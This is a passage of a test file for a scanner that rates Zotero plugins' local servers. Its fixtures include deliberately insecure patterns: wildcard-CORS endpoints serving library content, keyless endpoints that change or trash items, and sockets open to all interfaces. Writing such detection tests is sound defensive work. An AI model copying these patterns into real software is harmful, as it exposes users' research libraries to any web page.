      listener = { onSocketAccepted: async (_socket, transport) => { const text = await readRequest(transport); ${more}
        writeReply(transport, await addTags(JSON.parse(text.slice(text.indexOf("\\r\\n\\r\\n") + 4)).params.arguments)); } };
    }
    async function addTags(args) { const results = []; for (const key of args.itemKeys) { const item = ${find}; item.addTag(args.tag); await item.saveTx(); results.push(key); } return results; }
    function findItem(key) { for (const lib of Zotero.Libraries.getAll()) { const item = Zotero.Items.getByLibraryAndKey(lib.libraryID, key); if (item) return item; } return null; }
    function readRequest(t) { return ""; }
    function writeReply(t, r) {}
    new HttpServer().start(23124);`;

  it("does the same for its own server, unless a page can read library content from it", async () => {
    const keyed = await scanFiles({ "content/server.js": tagServer("findItem(key)") });
    expect(own(keyed)?.details).toMatchObject({
      web: "any",
      serverActions: ["changes-library"],
      needsKey: true,
    });
    expect(concernOf(keyed, "own-server")).toBe("medium");
    expect(keyed.card.label).toBe("review-details");
    // Tagging every item in the library needs no key.
    const all = await scanFiles({
      "content/server.js": tagServer("(await Zotero.Items.getAll(1))[0]"),
    });
    expect(concernOf(all, "own-server")).toBe("high");
    // Answers any page can read (`Access-Control-Allow-Origin: *`) with library content in them.
    const shown = await scanFiles({
      "content/server.js": tagServer(
        "findItem(key)",
        `if (text.startsWith("GET /cite")) return writeReply(transport, Zotero.Cite.makeFormattedBibliographyOrCitationList(style, items, "text"));`,
      ).concat(`\nconst CORS = { "Access-Control-Allow-Origin": "*" };`),
    });
    expect(own(shown)?.details?.needsKey).toBeUndefined();
    expect(concernOf(shown, "own-server")).toBe("high");
  });

  // systematic-reviewer: routes filed in a table by a function of its own named like httpd.js's
  // method, each checked for a random service token before it runs; a removed route answers 404.
  const tokenServer = (extra = "") => `
    const { HttpServer } = ChromeUtils.importESModule("chrome://remote/content/server/httpd.sys.mjs");
    const SERVICE_TOKEN = "srsvc-" + crypto.randomUUID();
    const routes = new Map();
    let appServer = null;
    function bearerToken(request) { return String(request.getHeader("Authorization") || "").replace(/^Bearer /, ""); }
    function send(response, status, body) { response.setStatusLine("1.1", status, "x"); response.setHeader("Access-Control-Allow-Origin", "*"); response.write(body); }
    function registerPathHandler(path, handler) { routes.set(path, handler); if (appServer) appServer.registerPathHandler(path, createRouteHandler(path)); }
    function unregisterPathHandler(path) { routes.delete(path); if (appServer) appServer.registerPathHandler(path, function RemovedRouteHandler(request, response) { send(response, 404, "Not found."); }); }
    function createRouteHandler(path) { return function routeHandler(request, response) {
      if (bearerToken(request) != SERVICE_TOKEN) return send(response, 401, "Missing or invalid token.");
      return routes.get(path)(request, response); }; }
    function startServer() { appServer = new HttpServer(); for (const path of routes.keys()) appServer.registerPathHandler(path, createRouteHandler(path)); appServer.start(-1); }
    registerPathHandler("/items", (request, response) => send(response, 200, JSON.stringify(Zotero.Items.getAll(1).map((i) => i.key))));
    ${extra}
    startServer();`;

  it("doesn't take Access-Control-Allow-Origin: * as opening a server whose every route wants a secret", async () => {
    const r = await scanFiles({ "content/server.js": tokenServer() });
    expect(own(r)?.details?.apis).toEqual(["httpd.js"]);
    expect(own(r)?.details?.web).toBeUndefined();
    expect(concernOf(r, "own-server")).toBe("low");
    // One route without the check: any page can talk to it.
    const open = await scanFiles({
      "content/server.js": tokenServer(
        `startServer(); appServer.registerPathHandler("/status", (request, response) => send(response, 200, "ok"));`,
      ),
    });
    expect(own(open)?.details?.apis).toContain("web pages can call it");
    expect(concernOf(open, "own-server")).toBe("medium");
  });

  it("reads where a server socket listens from its setting's default", async () => {
    // zotero-filelink-bridge: `init(port, !remoteAllowed, -1)`, allowRemote true in prefs.js.
    const socket = (arg: string, prefs?: string) =>
      scanFiles({
        "content/server.js": `class Bridge {
            allowRemote() { const allowed = Zotero.Prefs.get("extensions.fixture.allowRemote", true); return allowed === undefined ? true : !!allowed; }
            start(port) { const remoteAllowed = this.allowRemote();
              this.serverSocket = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket);
              this.serverSocket.init(port, ${arg}, -1);
              this.serverSocket.asyncListen({ onSocketAccepted() {} }); } }
          new Bridge().start(23121);`,
        ...(prefs ? { "prefs.js": prefs } : {}),
      });
    const wide = await socket("!remoteAllowed", `pref("extensions.fixture.allowRemote", true);`);
    expect(own(wide)?.details?.apis).toEqual([
      "listens beyond this computer by default (a setting)",
      "nsIServerSocket",
    ]);
    expect(concernOf(wide, "own-server")).toBe("medium");
    // Off by default (zotero-mcp-tags), or no default we can read: a setting opens it.
    const local = await socket("!remoteAllowed", `pref("extensions.fixture.allowRemote", false);`);
    expect(own(local)?.details?.apis).toContain("can listen beyond this computer (a setting)");
    const unknown = await socket("!remoteAllowed");
    expect(own(unknown)?.details?.apis).toContain("can listen beyond this computer (a setting)");
    // zotlite's minified `init(e, !1, -1)` is no setting: it always listens on every interface.
    const minified = await socket("!1");
    expect(own(minified)?.details?.apis).toContain("listens beyond this computer");
    const loopback = await socket("!0");
    expect(own(loopback)?.details?.apis).toEqual(["nsIServerSocket"]);
    // zotero-research-bridge: a frozen policy object's `loopbackOnly: true` is no setting either.
    const policy = await scanFiles({
      "content/server.js": `var BRIDGE_POLICY = Object.freeze({ defaultPort: 23121, loopbackOnly: true, remoteAccessAllowed: false });
        class Bridge { start(port) {
          this.serverSocket = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket);
          this.serverSocket.init(port, BRIDGE_POLICY.loopbackOnly, -1);
          this.serverSocket.asyncListen({ onSocketAccepted() {} }); } }
        new Bridge().start(BRIDGE_POLICY.defaultPort);`,
    });
    expect(own(policy)?.details?.apis).toEqual(["nsIServerSocket"]);
  });
});

describe("review of the follow-ups: numbers behind keyed changes, socket arguments, refusals", () => {
  const concernOf = (r: ScanOutput, id: string) =>
    r.card.capabilities.find((c) => c.id === id)?.concern;
  const endpoint = (init: string, more: Record<string, string> = {}) =>
    scanFiles({
      "content/a.js": `const Note = function () {};
        Note.prototype = { supportedMethods: ["POST"], supportedDataTypes: ["text/plain"], allowRequestsFromUnsafeWebContent: true,
          async init(req) { ${init} return [200, "text/plain", "ok"]; } };
        Zotero.Server.Endpoints["/x/note"] = Note;`,
      ...more,
    });
  const keyed = `const n = await Zotero.Items.getByLibraryAndKeyAsync(1, req.data.key); n.setNote(req.data.html); await n.saveTx();`;

  it("keeps a keyed change high when a number or other code stands behind another change", async () => {
    for (const [what, init, more] of [
      // A parent's number from the request, not from an item already found.
      [
        "parent from the request",
        `${keyed} const note = new Zotero.Item("note"); note.parentItemID = req.data.parentItemID; note.setNote(req.data.html); await note.saveTx();`,
      ],
      [
        "getAsync(req.data.parentItemID)",
        `${keyed} const p = await Zotero.Items.getAsync(req.data.parentItemID); p.addTag("x"); await p.saveTx();`,
      ],
      ["trashTx by number", `${keyed} await Zotero.Items.trashTx(req.data.ids);`],
      [
        "a collection by number",
        `${keyed} const c = await Zotero.Collections.getAsync(req.data.collectionID); c.deleted = true; await c.saveTx();`,
      ],
      [
        "SQL",
        `${keyed} const k = await Zotero.DB.valueQueryAsync("SELECT key FROM items WHERE itemID=?", [req.data.id]); const i = await Zotero.Items.getByLibraryAndKeyAsync(1, k); i.addTag("x"); await i.saveTx();`,
      ],
      // Items another file finds without a key (the selection), changed here.
      [
        "another file's selection",
        `${keyed} for (const i of targets()) { i.addTag("x"); await i.saveTx(); }`,
        {
          "content/b.js": `function targets() { return Zotero.getActiveZoteroPane().getSelectedItems(); }`,
        },
      ],
      // A writer in another file that makes items itself, or through a helper there.
      [
        "another file's writer",
        `${keyed} await importFromBody(req.data);`,
        {
          "content/b.js": `async function importFromBody(d) { const item = makeItem(d); await item.saveTx(); }
            function makeItem(d) { const item = new Zotero.Item("book"); item.setField("title", d.title); return item; }`,
        },
      ],
    ] as [string, string, Record<string, string>?][]) {
      const r = await endpoint(init, more);
      expect(capIn(r, "server-edits-library")?.details?.needsKey, what).toBeUndefined();
      expect(concernOf(r, "server-edits-library"), what).toBe("high");
    }
    // The number of an item found by key, or a parent already found, still needs the key.
    for (const init of [
      `const i = Zotero.Items.get(Zotero.Items.getIDFromLibraryAndKey(1, req.data.key)); i.addTag("x"); await i.saveTx();`,
      `const note = await Zotero.Items.getByLibraryAndKeyAsync(1, req.data.key); const parentItemID = note.id;
       await Zotero.Attachments.importEmbeddedImage({ blob: req.data.blob, parentItemID }); await saveNote(note, req.data.html);`,
    ]) {
      const r = await endpoint(init, {
        "content/b.js": `async function saveNote(note, html) { note.setNote(html); await note.saveTx(); }`,
      });
      expect(capIn(r, "server-edits-library")?.details?.needsKey, init.slice(0, 40)).toBe(true);
    }
  });

  it("takes keys a page can read from the selected items like those from library content", async () => {
    const r = await endpoint(keyed, {
      "content/c.js": `Zotero.Server.Endpoints["/x/selected"] = class { supportedMethods = ["GET"]; allowRequestsFromUnsafeWebContent = true;
          async init() { return [200, "application/json", JSON.stringify(Zotero.getActiveZoteroPane().getSelectedItems().map((i) => i.key))]; } };`,
    });
    expect(capIn(r, "server-edits-library")?.details?.needsKey).toBeUndefined();
    expect(concernOf(r, "server-edits-library")).toBe("high");
  });

  const socket = (body: string, after = "") =>
    scanFiles({
      "content/server.js": `class Server {
        ${body}
      }
      ${after}
      const s = new Server(); s.configure?.(); s.start(23120, !Zotero.Prefs.get("extensions.x.allowRemote", true));`,
    });
  const open = `this.serverSocket = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket);`;

  it("reads a socket's loopbackOnly once every value given to it is known, and not from a parameter's default", async () => {
    // A value given after the init call in the file.
    const later = await socket(`loopbackOnly = true;
      start(port) { ${open} this.serverSocket.init(port, this.loopbackOnly, -1); this.serverSocket.asyncListen({ onSocketAccepted() {} }); }
      configure() { this.loopbackOnly = !Zotero.Prefs.get("extensions.x.allowRemote", true); }`);
    expect(capIn(later, "own-server")?.details?.apis).toContain(
      "can listen beyond this computer (a setting)",
    );
    // A parameter holds what its callers pass.
    for (const params of ["port, loopbackOnly = true", "port, { loopbackOnly = true } = {}"]) {
      const param = await socket(
        `start(${params}) { ${open} this.serverSocket.init(port, loopbackOnly, -1); this.serverSocket.asyncListen({ onSocketAccepted() {} }); }`,
      );
      expect(capIn(param, "own-server")?.details?.apis, params).toContain(
        "can listen beyond this computer (a setting)",
      );
    }
    // A value given only once, before or after, is still fixed.
    const fixed = await socket(
      `start(port) { ${open} this.serverSocket.init(port, LOCAL_ONLY, -1); this.serverSocket.asyncListen({ onSocketAccepted() {} }); }`,
      "const LOCAL_ONLY = true;",
    );
    expect(capIn(fixed, "own-server")?.details?.apis).toEqual(["nsIServerSocket"]);
  });

  it("doesn't take a handler passing a number in the 400s to something else as refusing", async () => {
    const server = (route: string) =>
      scanFiles({
        "content/server.js": `
          const { HttpServer } = ChromeUtils.importESModule("chrome://remote/content/server/httpd.sys.mjs");
          const SERVICE_TOKEN = "svc-" + crypto.randomUUID();
          function send(response, status, body) { response.setStatusLine("1.1", status, "x"); response.setHeader("Access-Control-Allow-Origin", "*"); response.write(body); }
          function bearerToken(request) { return String(request.getHeader("Authorization") || "").replace(/^Bearer /, ""); }
          function relay(request, response, port) { const body = Zotero.HTTP.request("GET", "https://example.org:" + port + request.path); send(response, 200, body); }
          const server = new HttpServer();
          server.registerPathHandler("/items", (request, response) => {
            if (bearerToken(request) != SERVICE_TOKEN) return send(response, 401, "no");
            send(response, 200, "[]"); });
          server.registerPathHandler("/other", ${route});
          server.start(-1);`,
      });
    // A removed route answering 404 leaves nothing a page can talk to…
    const removed = await server(`(request, response) => send(response, 404, "Not found.")`);
    expect(capIn(removed, "own-server")?.details?.apis).not.toContain("web pages can call it");
    // …but a relay to port 443 answers any page.
    const relayed = await server(`(request, response) => relay(request, response, 443)`);
    expect(capIn(relayed, "own-server")?.details?.apis).toContain("web pages can call it");
  });
});
